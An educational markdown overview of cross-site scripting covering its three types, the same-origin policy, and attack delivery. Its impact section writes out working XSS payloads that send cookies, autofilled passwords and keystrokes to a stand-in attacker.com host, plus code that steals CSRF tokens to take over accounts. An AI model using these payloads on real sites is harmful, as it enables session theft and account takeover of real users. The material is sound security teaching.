# XSS Overview

> Cross-Site Scripting — what it is, how it works, why it matters, and what an attacker can actually do with it.

---

## What is Cross-Site Scripting?

Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript into a web page that is then executed by other users' browsers.

The browser has no way to distinguish between the website's legitimate JavaScript and the attacker's injected JavaScript. Both run with equal trust and equal access to everything on that page.

```
Normal flow:
Website sends JavaScript → Browser trusts it → Browser executes it

XSS flow:
Attacker injects JavaScript into website → Website sends it → Browser trusts it → Browser executes it
                                                                    ↑
                                                         Browser cannot tell the difference
```

---

## The Core Problem — Unsafe Reflection

XSS exists because applications take user input and include it in their output without properly sanitizing it first.

```python
# Vulnerable backend — pseudocode
search_term = request.args.get('q')
return f"<p>You searched for: {search_term}</p>"
```

When `search_term` is `<script>alert(1)</script>`, the server produces:

```html
<p>You searched for: <script>alert(1)</script></p>
```

The browser receives this and executes the script. The server was simply too trusting.

---

## How the Same Origin Policy Fits In

The Same Origin Policy (SOP) is the browser's primary security boundary. It prevents code from one website reading data from another.

```
SOP Rule:
evil.com cannot read data from bank.com
→ Different origins → access blocked
```

XSS defeats SOP completely — not by breaking through it, but by going around it entirely.

```
Normal attack from evil.com:
evil.com → tries to read bank.com → SOP blocks it ❌

XSS attack:
Attacker injects script INTO bank.com
Script runs ON bank.com
SOP sees bank.com talking to bank.com → no violation ✅
Attacker now has full access to bank.com data
```

> XSS doesn't attack through the wall. It gets delivered from inside the wall. SOP is never triggered.

---

## The Three Types of XSS

### 1. Reflected XSS

The malicious script comes from the current HTTP request. The server reflects user input directly back in the response without storing it.

```
Attack flow:
Attacker crafts malicious URL
→ Tricks victim into clicking it
→ Victim's browser sends request to server
→ Server reflects payload in response
→ Victim's browser executes it
```

```
https://site.com/search?q=<script>stealCookies()</script>
                                   ↑
                           reflected directly into the page
```

**Key characteristic:** Requires social engineering — victim must click a crafted link.

---

### 2. Stored XSS

The malicious script is saved in the application's database and served to every user who views the affected content.

```
Attack flow:
Attacker posts malicious comment
→ Server saves it to database
→ Every user who loads the page gets the payload
→ Every browser executes it automatically
```

**Key characteristic:** No link required. Every visitor is a victim. Far more dangerous than reflected.

---

### 3. DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript. The server never sees the payload. The browser processes and executes it directly.

```
Attack flow:
JavaScript reads attacker-controlled data (URL hash, location)
→ Passes it to a dangerous function (innerHTML, eval)
→ Browser executes it
→ Server was never involved
```

```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.slice(1);
//                                 ↑ sink          ↑ source — user controlled
```

**Key characteristic:** Server-side filtering is useless — the payload never reaches the server.

---

## Impact — What an Attacker Can Actually Do

When a script executes in a victim's browser, the attacker effectively becomes that user. The impact scales with the victim's privileges.

### Session Hijacking
```javascript
fetch('https://attacker.com/steal?c=' + document.cookie)
```
Steal the session cookie → log in as the victim → no password needed.

### Account Takeover via CSRF Token Theft
```javascript
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
      let token = html.match(/csrf" value="([^"]+)"/)[1];
      fetch('/my-account/change-email', {
          method: 'POST',
          body: `email=attacker@evil.com&csrf=${token}`
      });
  });
```
Read the CSRF token from the victim's own page → forge authenticated requests → change email → trigger password reset → full account takeover.

### Credential Capture
```javascript
document.body.innerHTML += `
  <input type="text" id="u" autocomplete="username" style="display:none">
  <input type="password" id="p" autocomplete="current-password" style="display:none">
`;
setTimeout(() => {
    fetch('https://attacker.com/steal?u=' + u.value + '&p=' + p.value);
}, 1000);
```
Inject invisible login fields → password manager auto-fills → credentials sent to attacker.

### Keylogging
```javascript
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?k=' + e.key);
});
```
Every keystroke sent to the attacker's server in real time.

### Page Defacement
```javascript
document.body.innerHTML = '<h1>Hacked</h1>';
```

### Redirect to Phishing
```javascript
document.location = 'https://evil.com/fake-login';
```

### Full Application Compromise
If the victim has admin privileges — the attacker inherits those privileges. Create users, modify configurations, access all data, delete records.

---

## Severity by Victim

| Victim Type | Impact |
|---|---|
| Regular user | Session theft, credential capture, account takeover |
| Admin user | Full application compromise, all user data exposed |
| Internal staff | Internal system access, pivot to internal network |
| Support agent | Access to all customer accounts they can view |

---

## XSS vs Other Vulnerabilities

| Vulnerability | Executes on | Impact |
|---|---|---|
| XSS | Client (browser) | Compromises users |
| SQL Injection | Server (database) | Compromises data |
| SSRF | Server (network) | Compromises infrastructure |
| CSRF | Client (forged request) | Performs actions — but blind |
| XSS + CSRF | Client (two-way) | Performs actions AND reads responses |

> XSS turns a one-way CSRF attack into a two-way fully interactive attack. This is why XSS is consistently rated one of the most critical web vulnerabilities.

---

## Proof of Concept — Why `alert()`

When testing for XSS, the standard proof of concept is:

```javascript
<script>alert(document.domain)</script>
```

- `alert()` — produces a visible, undeniable popup proving execution
- `document.domain` — confirms which domain the script executed on
- Harmless — proves the vulnerability without causing damage

```javascript
// Chrome 92+ blocks alert() in cross-origin iframes
// Use print() as alternative
<script>print()</script>
```

In real attacks, replace `alert()` with any of the payloads above.

---

## The Attacker's Delivery Problem

### Reflected XSS — Needs Social Engineering
The victim must visit a crafted URL. Delivery methods:
```
Phishing emails       → "Your account needs verification"
Malicious websites    → embed the link on a page
Social media          → post the link publicly
Shortened URLs        → hide the malicious parameters
QR codes              → physical world delivery
```

### Stored XSS — Self-Contained
No delivery needed. The payload waits in the database and executes automatically for every visitor.

### DOM XSS — URL Fragment Based
The `#fragment` never reaches the server. Deliver via the same methods as reflected — but the server-side WAF is completely blind to it.

---

## Browser Rendering — Why Injection Works

Understanding why XSS works requires understanding how browsers parse pages.

```
Step 1 — HTML Parser runs first:
Reads raw HTML top to bottom
Builds every element into the DOM
Finds <script> tags → marks them for execution
Does NOT validate JavaScript syntax
Does NOT ask "should this script be here?"

Step 2 — JavaScript Engine runs after:
Executes scripts identified by HTML parser
Has full access to the complete DOM
Can read, modify, delete anything on the page

The gap between Step 1 and Step 2 is where XSS lives.
The HTML parser is trusting. It builds what it finds.
```

---

## Quick Reference — XSS Types

```
┌─────────────────────────────────────────────────────┐
│                    XSS Types                        │
├──────────────┬──────────────┬───────────────────────┤
│   Reflected  │    Stored    │      DOM-Based        │
├──────────────┼──────────────┼───────────────────────┤
│ In request   │ In database  │ In client-side JS     │
│ Affects one  │ Affects all  │ Server never involved │
│ Needs link   │ Self-contained│ Needs link           │
│ Lower impact │ Higher impact│ Bypasses server WAF   │
└──────────────┴──────────────┴───────────────────────┘
```

---

## Resources

| Resource | Link |
|---|---|
| PortSwigger XSS Learning Path | [Web Security Academy](https://portswigger.net/web-security/cross-site-scripting) |
| PortSwigger XSS Cheat Sheet | [Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) |
| OWASP XSS Prevention Cheat Sheet | [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| OWASP Top 10 | [A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/) |

---

*Next → [Attack Surface](./attack-surface.md) — where to look and what to test*